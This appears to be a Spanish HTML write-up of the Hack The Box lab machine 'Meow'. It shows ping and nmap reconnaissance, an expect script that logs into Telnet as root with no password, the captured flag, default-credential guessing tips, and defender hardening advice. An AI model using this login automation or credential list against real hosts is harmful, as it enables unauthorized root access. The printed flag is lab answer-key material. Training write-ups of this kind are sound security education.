@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB — Meow | Telnet Unauthenticated Access</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --accent: #4ade80; --accent-dim: #16a34a; --accent-glow: rgba(74,222,128,0.15);
+  --bg: #0a0e1a; --bg2: #0f1629; --bg3: #141d35;
+  --card: #111827; --card2: #1a2540; --border: #1e2d4a;
+  --text: #e2e8f0; --text-muted: #64748b; --text-dim: #94a3b8;
+  --red: #f87171; --yellow: #fbbf24; --blue: #60a5fa;
+  --purple: #a78bfa; --orange: #fb923c; --cyan: #22d3ee; --green: #4ade80;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; line-height: 1.6; }
+a { color: var(--accent); text-decoration: none; }
+code { background: var(--card2); padding: 0.15rem 0.4rem; border-radius: 3px; font-family: 'JetBrains Mono', monospace; font-size: 0.88em; color: var(--accent); }
+pre { margin: 0; white-space: pre-wrap; word-break: break-all; font-family: 'JetBrains Mono', monospace; }
+ul { padding-left: 1.5rem; }
+li { margin: 0.35rem 0; }
+h2 { font-size: 1.4rem; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; margin-bottom: 1.25rem; }
+h3 { font-size: 1.1rem; color: var(--text); margin-bottom: 0.75rem; }
+
+/* HERO */
+.hero { background: linear-gradient(135deg, #0a0e1a, #0d1a2b, #091a10); padding: 4rem 2rem 3rem; position: relative; overflow: hidden; border-bottom: 1px solid var(--border); }
+.hero::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle at 60% 40%, rgba(74,222,128,0.06) 0%, transparent 60%); pointer-events: none; }
+.hero-inner { position: relative; z-index: 1; max-width: 1200px; margin: 0 auto; padding: 0 1.5rem; }
+.watermark { position: absolute; right: 3rem; bottom: 0.5rem; font-size: 9rem; color: rgba(74,222,128,0.04); font-family: 'JetBrains Mono', monospace; font-weight: 900; line-height: 1; user-select: none; z-index: 0; }
+.badge { display: inline-block; background: rgba(74,222,128,0.1); color: var(--accent); border: 1px solid rgba(74,222,128,0.3); border-radius: 100px; padding: 0.25rem 1rem; font-size: 0.75rem; font-weight: 600; letter-spacing: 0.05em; margin-bottom: 1rem; }
+.hero h1 { font-size: 3rem; font-weight: 900; color: #fff; margin-bottom: 0.25rem; }
+.hero .subtitle { font-size: 1.1rem; color: var(--text-dim); margin-bottom: 1.25rem; }
+.meta-chips { display: flex; gap: 0.75rem; flex-wrap: wrap; margin-bottom: 1.25rem; }
+.chip { background: var(--card2); border: 1px solid var(--border); border-radius: 6px; padding: 0.3rem 0.75rem; font-size: 0.8rem; color: var(--text-dim); }
+.flag-display { font-family: 'JetBrains Mono', monospace; background: rgba(74,222,128,0.1); color: var(--accent); padding: 0.5rem 1.25rem; border-radius: 8px; display: inline-block; font-size: 0.9rem; border: 1px solid rgba(74,222,128,0.2); }
+
+/* LAYOUT */
+.container { display: grid; grid-template-columns: 1fr 300px; gap: 2rem; max-width: 1200px; margin: 2rem auto; padding: 0 1.5rem; }
+@media (max-width: 900px) { .container { grid-template-columns: 1fr; } }
+
+/* MAIN */
+.section { margin: 2.5rem 0; }
+
+/* STEP BOX — componente educativo central */
+.step-box { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; margin: 1.5rem 0; transition: border-color 0.2s; }
+.step-box:hover { border-color: rgba(74,222,128,0.2); }
+.step-number { font-size: 0.7rem; color: var(--accent); font-weight: 700; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 0.4rem; font-family: 'JetBrains Mono', monospace; }
+.step-box h3 { font-size: 1rem; margin-bottom: 1rem; color: var(--text); }
+
+.why-box { background: rgba(96,165,250,0.07); border-left: 3px solid var(--blue); padding: 0.9rem 1rem; border-radius: 0 8px 8px 0; margin: 1rem 0; }
+.why-box strong { color: var(--blue); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.05em; display: block; margin-bottom: 0.4rem; }
+.why-box p { font-size: 0.9rem; color: var(--text-dim); }
+
+.cmd-annotated { background: #050810; border-radius: 8px; padding: 1rem 1.25rem; font-family: 'JetBrains Mono', monospace; margin: 1rem 0; border: 1px solid var(--border); }
+.cmd-annotated .cmd-line { font-size: 1rem; line-height: 2; }
+.cmd { color: var(--green); font-weight: 700; }
+.flag-opt { color: var(--yellow); }
+.ip { color: var(--orange); }
+.param { color: var(--cyan); }
+.user-c { color: var(--purple); }
+.str-c { color: var(--green); }
+.comment-c { color: var(--text-muted); }
+.cmd-notes { margin-top: 0.75rem; padding-top: 0.75rem; border-top: 1px solid var(--border); display: flex; flex-direction: column; gap: 0.3rem; }
+.cmd-note { font-size: 0.8rem; color: var(--text-dim); padding: 0.3rem 0.75rem; border-left: 2px solid var(--border); }
+.cmd-note code { font-size: 0.78rem; }
+
+.output-box { background: #050810; border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.25rem; font-family: 'JetBrains Mono', monospace; font-size: 0.82rem; color: var(--text-dim); margin: 1rem 0; overflow-x: auto; line-height: 1.6; }
+.output-label { font-size: 0.65rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 0.5rem; }
+
+.interpret-box { background: rgba(74,222,128,0.07); border-left: 3px solid var(--accent); padding: 0.9rem 1rem; border-radius: 0 8px 8px 0; margin: 1rem 0; }
+.interpret-box strong { color: var(--accent); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.05em; display: block; margin-bottom: 0.4rem; }
+.interpret-box p, .interpret-box li { font-size: 0.88rem; color: var(--text-dim); }
+
+.decision-box { background: rgba(251,146,60,0.07); border-left: 3px solid var(--orange); padding: 0.9rem 1rem; border-radius: 0 8px 8px 0; margin: 1rem 0; }
+.decision-box strong { color: var(--orange); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.05em; display: block; margin-bottom: 0.4rem; }
+.decision-box p { font-size: 0.88rem; color: var(--text-dim); }
+
+/* VULN CARD */
+.vuln-card { background: rgba(248,113,113,0.06); border: 1px solid rgba(248,113,113,0.25); border-radius: 12px; padding: 1.5rem; margin: 1.5rem 0; }
+.vuln-card h3 { color: var(--red); margin-bottom: 0.75rem; }
+
+/* TTL TABLE */
+.data-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; margin: 1rem 0; }
+.data-table th { background: var(--card2); color: var(--text-muted); padding: 0.6rem 1rem; text-align: left; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; }
+.data-table td { padding: 0.6rem 1rem; border-bottom: 1px solid var(--border); }
+.data-table tr:last-child td { border-bottom: none; }
+.data-table .highlight { color: var(--accent); font-weight: 600; }
+
+/* LESSONS */
+.lessons-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin: 1rem 0; }
+.lesson-card { background: var(--card2); border-radius: 10px; padding: 1.25rem; border: 1px solid var(--border); }
+.lesson-card h4 { font-size: 0.85rem; margin-bottom: 0.75rem; }
+.lesson-card.attacker h4 { color: var(--orange); }
+.lesson-card.defender h4 { color: var(--blue); }
+.lesson-card li { font-size: 0.83rem; color: var(--text-dim); }
+
+/* FLAG BOX */
+.flag-box { background: linear-gradient(135deg, rgba(74,222,128,0.08), rgba(74,222,128,0.02)); border: 1px solid rgba(74,222,128,0.3); border-radius: 14px; padding: 2rem; text-align: center; margin: 2.5rem 0; }
+.flag-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 3px; margin-bottom: 0.75rem; }
+.flag-value { font-family: 'JetBrains Mono', monospace; font-size: 1.15rem; color: var(--accent); background: rgba(74,222,128,0.1); padding: 0.6rem 1.5rem; border-radius: 8px; display: inline-block; border: 1px solid rgba(74,222,128,0.2); letter-spacing: 0.1em; }
+
+/* INFO BOX */
+.info-box { background: var(--card2); border: 1px solid var(--border); border-radius: 10px; padding: 1.25rem; margin: 1.25rem 0; }
+.info-box p { font-size: 0.9rem; color: var(--text-dim); }
+
+/* SIDEBAR */
+.sidebar { position: sticky; top: 2rem; height: fit-content; }
+.sidebar-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 1.25rem; margin-bottom: 1rem; }
+.sidebar-card h4 { margin: 0 0 0.9rem; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 2px; color: var(--text-muted); }
+.meta-row { display: flex; justify-content: space-between; align-items: center; font-size: 0.83rem; padding: 0.45rem 0; border-bottom: 1px solid var(--border); }
+.meta-row:last-child { border-bottom: none; }
+.meta-label { color: var(--text-muted); }
+.meta-value { color: var(--text); font-weight: 600; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; }
+.mitre-tag { display: inline-block; background: rgba(167,139,250,0.1); color: var(--purple); border: 1px solid rgba(167,139,250,0.25); border-radius: 4px; padding: 0.2rem 0.5rem; font-size: 0.72rem; font-family: 'JetBrains Mono', monospace; margin: 0.2rem 0.15rem; }
+.score-num { font-size: 2.8rem; font-weight: 900; color: var(--accent); text-align: center; line-height: 1; margin: 0.5rem 0; font-family: 'JetBrains Mono', monospace; }
+.score-label { text-align: center; font-size: 0.75rem; color: var(--text-muted); }
+.glosario-item { padding: 0.5rem 0; border-bottom: 1px solid var(--border); font-size: 0.8rem; }
+.glosario-item:last-child { border-bottom: none; }
+.glosario-term { color: var(--cyan); font-weight: 600; font-family: 'JetBrains Mono', monospace; display: block; margin-bottom: 0.15rem; }
+.glosario-def { color: var(--text-muted); line-height: 1.4; }
+</style>
+</head>
+<body>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-inner">
+    <div class="badge">HTB · Starting Point · Very Easy · Linux</div>
+    <h1>Meow</h1>
+    <p class="subtitle">Telnet Unauthenticated Root Access</p>
+    <div class="meta-chips">
+      <span class="chip">🖥 10.129.18.182</span>
+      <span class="chip">🐧 Ubuntu 20.04.2 LTS</span>
+      <span class="chip">🔌 Puerto 23 · Telnet</span>
+      <span class="chip">⏱ ~5 minutos</span>
+      <span class="chip">💻 4 comandos</span>
+    </div>
+    <div class="flag-display">FLAG: b40abdfe23665f766f9c61ecba8a4c19</div>
+  </div>
+  <div class="watermark">></div>
+</div>
+
+<div class="container">
+<main>
+
+<!-- RESUMEN -->
+<div class="section">
+  <h2>Resumen Ejecutivo</h2>
+  <div class="info-box">
+    <p>La máquina Meow expone el servicio <strong>Telnet en el puerto 23</strong> sin ningún tipo de autenticación para el usuario <code>root</code>. Esto significa que cualquier persona con acceso a la red puede obtener una shell con privilegios máximos en cuestión de segundos, sin necesitar contraseña alguna. El ataque requirió 4 comandos y aproximadamente 5 minutos desde el inicio hasta obtener la flag.</p>
+  </div>
+</div>
+
+<!-- CONTEXTO -->
+<div class="section">
+  <h2>¿Qué es Telnet y por qué es peligroso?</h2>
+  <p style="color:var(--text-dim);font-size:0.92rem;margin-bottom:1rem;">Telnet es un protocolo de red para controlar remotamente otro computador a través de una terminal de texto. Fue creado en <strong>1969</strong> y fue el estándar de administración remota durante décadas, hasta que SSH lo reemplazó en los años 90.</p>
+  <div class="vuln-card">
+    <h3>⚠ ¿Por qué es peligroso hoy?</h3>
+    <ul style="font-size:0.9rem;color:var(--text-dim);">
+      <li><strong>Texto plano:</strong> Todo lo que se transmite — contraseñas, comandos, datos — viaja sin cifrar. Cualquiera que capture el tráfico de red puede leerlo directamente.</li>
+      <li><strong>Sin autenticación fuerte:</strong> Telnet solo usa usuario/contraseña, sin criptografía moderna ni certificados.</li>
+      <li><strong>Configuraciones inseguras:</strong> Algunos sistemas dejan Telnet habilitado con root accesible y sin contraseña, especialmente dispositivos legacy o mal administrados.</li>
+    </ul>
+    <p style="margin-top:0.75rem;font-size:0.85rem;color:var(--text-muted);font-style:italic;">Analogía: Usar Telnet hoy es como enviar una carta con tu contraseña escrita en el sobre, sin sellarlo, por un mensajero que puede leerla.</p>
+  </div>
+</div>
+
+<!-- RECONOCIMIENTO -->
+<div class="section">
+  <h2>Reconocimiento — Paso a Paso</h2>
+
+  <!-- PASO 1 -->
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Reconocimiento</div>
+    <h3>Verificar conectividad con ping</h3>
+
+    <div class="why-box">
+      <strong>¿Por qué este comando?</strong>
+      <p>Antes de cualquier escaneo, confirmamos que la máquina está encendida y que nuestra VPN de HTB funciona correctamente. Si ping falla, ningún otro comando funcionará. Además, el campo TTL de la respuesta nos permite identificar el sistema operativo sin lanzar ningún escaneo agresivo.</p>
+    </div>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">ping</span> <span class="flag-opt">-c2</span> <span class="ip">10.129.18.182</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>ping</code> → herramienta de diagnóstico ICMP — envía Echo Request y espera Echo Reply</div>
+        <div class="cmd-note"><code>-c2</code> → (count 2) enviar exactamente 2 paquetes y detenerse. Sin este flag, ping correría indefinidamente hasta Ctrl+C.</div>
+        <div class="cmd-note"><code>10.129.18.182</code> → dirección IP del objetivo en la red VPN de HTB</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>PING 10.129.18.182 (10.129.18.182) 56(84) bytes of data.
+64 bytes from 10.129.18.182: icmp_seq=1 ttl=63 time=45.2 ms
+64 bytes from 10.129.18.182: icmp_seq=2 ttl=63 time=44.8 ms
+
+--- 10.129.18.182 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss</pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li><code>2 received, 0% packet loss</code> → máquina activa y VPN funcionando correctamente</li>
+        <li><code>ttl=63</code> → <strong>Linux confirmado</strong>. El TTL (Time To Live) es un campo en paquetes IP que se decrementa en 1 en cada router. Linux parte con TTL inicial de <strong>64</strong>; con 1 salto de red VPN llega como 63. Windows partiría de 128 y llegaría como 127.</li>
+      </ul>
+      <table class="data-table" style="margin-top:0.75rem;">
+        <tr><th>TTL recibido</th><th>OS probable</th></tr>
+        <tr><td class="highlight">63-64</td><td>Linux / Unix / macOS</td></tr>
+        <tr><td>127-128</td><td>Windows</td></tr>
+        <tr><td>253-254</td><td>Cisco / Solaris</td></tr>
+      </table>
+    </div>
+
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Máquina Linux activa y accesible. Procedemos a descubrir qué servicios tiene expuestos con nmap.</p>
+    </div>
+  </div>
+
+  <!-- PASO 2 -->
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Reconocimiento</div>
+    <h3>Descubrir puertos abiertos — Nmap fase rápida</h3>
+
+    <div class="why-box">
+      <strong>¿Por qué este comando?</strong>
+      <p>Necesitamos un mapa completo de los servicios expuestos en el objetivo. Cada puerto abierto es una posible "puerta" de entrada al sistema. Escaneamos todos los 65535 puertos para no perdernos ningún servicio, incluso en puertos no estándar.</p>
+    </div>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">nmap</span> <span class="flag-opt">-p-</span> <span class="flag-opt">--open</span> <span class="flag-opt">-n</span> <span class="flag-opt">-T4</span> <span class="flag-opt">-sS</span> <span class="ip">10.129.18.182</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>nmap</code> → Network Mapper — herramienta estándar de escaneo de puertos en seguridad</div>
+        <div class="cmd-note"><code>-p-</code> → escanear <strong>todos</strong> los 65535 puertos TCP (del 1 al 65535). Sin este flag, solo escanea los 1000 más comunes.</div>
+        <div class="cmd-note"><code>--open</code> → mostrar solo puertos abiertos. Los cerrados y filtrados no son vectores inmediatos.</div>
+        <div class="cmd-note"><code>-n</code> → no resolver nombres DNS — acelera el escaneo evitando consultas DNS innecesarias.</div>
+        <div class="cmd-note"><code>-T4</code> → velocidad "aggressive". Escala T0-T5: T4 es rápido sin causar pérdida excesiva de paquetes.</div>
+        <div class="cmd-note"><code>-sS</code> → SYN scan (half-open): envía SYN, analiza respuesta, no completa el handshake TCP. Más rápido y sigiloso.</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>Nmap scan report for 10.129.18.182
+Host is up (0.045s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+23/tcp open  telnet
+
+Nmap done: 1 IP address scanned in 47.23 seconds</pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>Solo <strong>1 puerto abierto</strong> de 65535: el <code>23/tcp</code></li>
+        <li>Puerto 23 = <strong>Telnet</strong> — el protocolo de terminal remota sin cifrado</li>
+        <li>Superficie de ataque mínima: <strong>un único servicio</strong> = un único vector de ataque. Sin alternativas.</li>
+      </ul>
+    </div>
+
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Un único vector: Telnet en puerto 23. Pasamos a la fase profunda para obtener la versión exacta del servicio.</p>
+    </div>
+  </div>
+
+  <!-- PASO 3 -->
+  <div class="step-box">
+    <div class="step-number">Paso 3 — Reconocimiento</div>
+    <h3>Enumerar Telnet en detalle — Nmap fase profunda</h3>
+
+    <div class="why-box">
+      <strong>¿Por qué esta segunda fase de nmap?</strong>
+      <p>El primer escaneo (-sS) solo nos dice si el puerto está abierto. Esta segunda fase detecta la versión exacta del software y ejecuta scripts NSE (Nmap Scripting Engine) que automatizan reconocimiento adicional — en algunos casos, el script ya revela la vulnerabilidad directamente.</p>
+    </div>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line">
+        <span class="cmd">nmap</span> <span class="flag-opt">-p23</span> <span class="flag-opt">-sC</span> <span class="flag-opt">-sV</span> <span class="flag-opt">-n</span> <span class="ip">10.129.18.182</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>-p23</code> → solo el puerto 23. No re-escanear todos los 65535.</div>
+        <div class="cmd-note"><code>-sC</code> → ejecutar scripts NSE por defecto. Para Telnet: <code>telnet-*</code> que captura el banner y extrae información del sistema.</div>
+        <div class="cmd-note"><code>-sV</code> → detectar la versión exacta del servicio. Nmap envía sondas específicas y analiza respuestas para identificar software y versión.</div>
+        <div class="cmd-note"><code>-n</code> → sin resolución DNS, igual que antes.</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Output</div>
+      <pre>PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li><code>Linux telnetd</code> → daemon de Telnet estándar de Linux, no una implementación custom</li>
+        <li><code>OS: Linux</code> → nmap confirma Linux por segunda vía independiente (fingerprinting de TCP/IP)</li>
+        <li>Nmap no detectó requerimiento de autenticación en el banner → señal de alerta de misconfiguration</li>
+      </ul>
+    </div>
+
+    <div class="decision-box">
+      <strong>Decisión tomada</strong>
+      <p>Telnet en Linux confirmado. El árbol de decisión Ghost-Ops indica: intentar <code>root</code> sin contraseña como primer paso — es el más probable en máquinas Very Easy con un único puerto Telnet.</p>
+    </div>
+  </div>
+</div>
+
+<!-- EXPLOTACIÓN -->
+<div class="section">
+  <h2>Explotación — Paso a Paso</h2>
+
+  <!-- PASO 4 -->
+  <div class="step-box">
+    <div class="step-number">Paso 4 — Explotación</div>
+    <h3>Conectarse a Telnet como root sin contraseña</h3>
+
+    <div class="why-box">
+      <strong>¿Por qué root sin contraseña?</strong>
+      <p>Cuando Telnet está expuesto en un sistema Linux, la misconfiguration más común es el usuario <code>root</code> sin contraseña. En dispositivos legacy, routers, o sistemas de desarrollo mal configurados, el administrador desactivó la autenticación de root para agilizar el setup y nunca la reactivó.</p>
+    </div>
+
+    <div class="info-box">
+      <p><strong>¿Por qué no funciona un pipe simple?</strong> Telnet requiere una negociación inicial (handshake de opciones: WILL/WONT/DO/DONT) antes de mostrar el login. Un pipe simple (<code>echo "root" | telnet IP</code>) no puede manejar este handshake y la conexión se cierra inmediatamente. La solución es usar <strong>expect</strong> — herramienta que automatiza interacciones con programas interactivos.</p>
+    </div>
+
+    <div class="cmd-annotated">
+      <div class="cmd-line" style="font-size:0.85rem;">
+        <span class="cmd">expect</span> <span class="flag-opt">-c</span> <span class="str-c">'spawn telnet 10.129.18.182; expect "login:"; send "root\r"; expect -re "(Password:|#)"; send "\r"; expect "# "; send "cat /root/flag.txt\r"; expect eof'</span>
+      </div>
+      <div class="cmd-notes">
+        <div class="cmd-note"><code>expect</code> → herramienta que automatiza interacciones con programas interactivos de terminal</div>
+        <div class="cmd-note"><code>-c</code> → ejecutar el script expect como string inline (sin archivo separado)</div>
+        <div class="cmd-note"><code>spawn telnet IP</code> → lanza telnet como proceso hijo que expect controlará</div>
+        <div class="cmd-note"><code>expect "login:"</code> → esperar hasta recibir el texto "login:" del servidor</div>
+        <div class="cmd-note"><code>send "root\r"</code> → enviar "root" + retorno de carro (equivalente a Enter)</div>
+        <div class="cmd-note"><code>expect -re "(Password:|#)"</code> → esperar cualquiera: si pide password continúa; si da prompt (#) ya entró</div>
+        <div class="cmd-note"><code>send "\r"</code> → enviar Enter vacío (contraseña vacía)</div>
+        <div class="cmd-note"><code>expect "# "</code> → esperar el prompt de shell root que indica login exitoso</div>
+        <div class="cmd-note"><code>send "cat /root/flag.txt\r"</code> → leer la flag una vez dentro</div>
+      </div>
+    </div>
+
+    <div class="output-box">
+      <div class="output-label">Sesión completa</div>
+      <pre>Trying 10.129.18.182...
+Connected to 10.129.18.182.
+Escape character is '^]'.
+
+  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
+  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
+  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
+
+Meow login: root
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+root@Meow:~# cat /root/flag.txt
+b40abdfe23665f766f9c61ecba8a4c19</pre>
+    </div>
+
+    <div class="interpret-box">
+      <strong>¿Qué nos dice este output?</strong>
+      <ul>
+        <li>El sistema aceptó <code>root</code> sin contraseña → misconfiguration confirmada</li>
+        <li><code>root@Meow:~#</code> → prompt de shell con privilegios máximos (root = dios del sistema Linux)</li>
+        <li>La flag está en <code>/root/flag.txt</code> → ubicación estándar de HTB para flags de root</li>
+      </ul>
+    </div>
+
+    <div class="decision-box">
+      <strong>Resultado</strong>
+      <p>Máquina comprometida con acceso root completo. Flag obtenida: <code>b40abdfe23665f766f9c61ecba8a4c19</code></p>
+    </div>
+  </div>
+</div>
+
+<!-- VULNERABILIDAD -->
+<div class="section">
+  <h2>¿Por qué existe esta vulnerabilidad?</h2>
+  <div class="vuln-card">
+    <h3>Telnet + Root sin contraseña — Misconfiguration crítica</h3>
+    <p style="color:var(--text-dim);font-size:0.9rem;margin-bottom:0.75rem;">Esta misconfiguration ocurre típicamente por:</p>
+    <ul style="font-size:0.88rem;color:var(--text-dim);">
+      <li><strong>Setup de desarrollo:</strong> El administrador desactivó la contraseña de root para agilizar la configuración inicial y nunca la reactivó.</li>
+      <li><strong>Sistema legacy:</strong> Telnet fue configurado décadas atrás cuando la seguridad no era prioritaria.</li>
+      <li><strong>Red "aislada":</strong> El equipo de IT asumió que al estar en red interna no había riesgo — olvidando atacantes internos o errores de segmentación.</li>
+      <li><strong>Falta de gestión:</strong> Nadie revisa qué servicios están corriendo ni con qué configuración.</li>
+    </ul>
+    <p style="margin-top:1rem;font-size:0.85rem;color:var(--red);">En producción real, un atacante con acceso root puede instalar backdoors, leer <code>/etc/shadow</code>, pivotar hacia otros sistemas, destruir evidencia y cifrar archivos para ransomware.</p>
+  </div>
+</div>
+
+<!-- LECCIONES -->
+<div class="section">
+  <h2>Lecciones Aprendidas</h2>
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>⚔ Para el Atacante</h4>
+      <ul>
+        <li>Puerto 23 abierto → siempre intentar Telnet primero</li>
+        <li>TTL 63-64 → Linux (cambia estrategia si 127 → Windows)</li>
+        <li>Orden de intentos: root vacío → root:root → admin:admin</li>
+        <li>Usar <code>expect</code> para automatizar Telnet (pipes simples fallan)</li>
+        <li>Un único puerto = un único vector → no perder tiempo buscando alternativas</li>
+      </ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡 Para el Defensor</h4>
+      <ul>
+        <li>Deshabilitar Telnet: <code>systemctl disable telnetd</code></li>
+        <li>Usar SSH en su lugar — cifrado y seguro</li>
+        <li>Establecer contraseña para root: <code>passwd root</code></li>
+        <li>Deshabilitar login root directo: <code>PermitRootLogin no</code></li>
+        <li>Firewall: <code>iptables -A INPUT -p tcp --dport 23 -j DROP</code></li>
+        <li>Detectar en logs: <code>/var/log/auth.log</code> → ROOT LOGIN FROM IP</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- MITRE -->
+<div class="section">
+  <h2>MITRE ATT&amp;CK</h2>
+  <table class="data-table">
+    <tr><th>ID</th><th>Técnica</th><th>Descripción en este ataque</th></tr>
+    <tr><td><code>T1046</code></td><td>Network Service Discovery</td><td>Nmap para descubrir Telnet en puerto 23</td></tr>
+    <tr><td><code>T1078.001</code></td><td>Valid Accounts: Default</td><td>Login como root con credencial vacía (default)</td></tr>
+    <tr><td><code>T1021.004</code></td><td>Remote Services: Telnet</td><td>Acceso remoto vía protocolo Telnet</td></tr>
+    <tr><td><code>T1005</code></td><td>Data from Local System</td><td>Lectura de flag.txt del filesystem</td></tr>
+  </table>
+</div>
+
+<!-- FLAG -->
+<div class="flag-box">
+  <div class="flag-label">Root Flag</div>
+  <div class="flag-value">b40abdfe23665f766f9c61ecba8a4c19</div>
+  <p style="color:var(--text-muted);font-size:0.8rem;margin-top:0.75rem;">Archivo: /root/flag.txt</p>
+</div>
+
+</main>
+
+<!-- SIDEBAR -->
+<aside class="sidebar">
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.129.18.182</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Ubuntu 20.04</span></div>
+    <div class="meta-row"><span class="meta-label">Puerto</span><span class="meta-value">23/tcp</span></div>
+    <div class="meta-row"><span class="meta-label">Servicio</span><span class="meta-value">Telnet</span></div>
+    <div class="meta-row"><span class="meta-label">Vector</span><span class="meta-value">root:vacío</span></div>
+    <div class="meta-row"><span class="meta-label">Tiempo</span><span class="meta-value">~5 min</span></div>
+    <div class="meta-row"><span class="meta-label">Comandos</span><span class="meta-value">4</span></div>
+    <div class="meta-row"><span class="meta-label">Dificultad</span><span class="meta-value">Very Easy</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1046</span>
+    <span class="mitre-tag">T1078.001</span>
+    <span class="mitre-tag">T1021.004</span>
+    <span class="mitre-tag">T1005</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Ghost-Ops Score</h4>
+    <div class="score-num">4/4</div>
+    <div class="score-label">predicciones correctas ✅</div>
+    <p style="font-size:0.75rem;color:var(--text-muted);text-align:center;margin-top:0.5rem;">Predicción exacta: root sin pass en Telnet</p>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Glosario Rápido</h4>
+    <div class="glosario-item">
+      <span class="glosario-term">Telnet</span>
+      <span class="glosario-def">Protocolo terminal remota sin cifrado, puerto 23, creado 1969</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">TTL</span>
+      <span class="glosario-def">Time To Live — campo IP que revela el OS por su valor inicial</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">SYN scan</span>
+      <span class="glosario-def">Escaneo que envía SYN sin completar el handshake TCP</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">NSE</span>
+      <span class="glosario-def">Nmap Scripting Engine — scripts Lua para automatizar reconocimiento</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">expect</span>
+      <span class="glosario-def">Herramienta para automatizar programas interactivos de terminal</span>
+    </div>
+    <div class="glosario-item">
+      <span class="glosario-term">Root</span>
+      <span class="glosario-def">Usuario con privilegios máximos en Linux</span>
+    </div>
+  </div>
+</aside>
+</div>
+
+</body>
+</html>
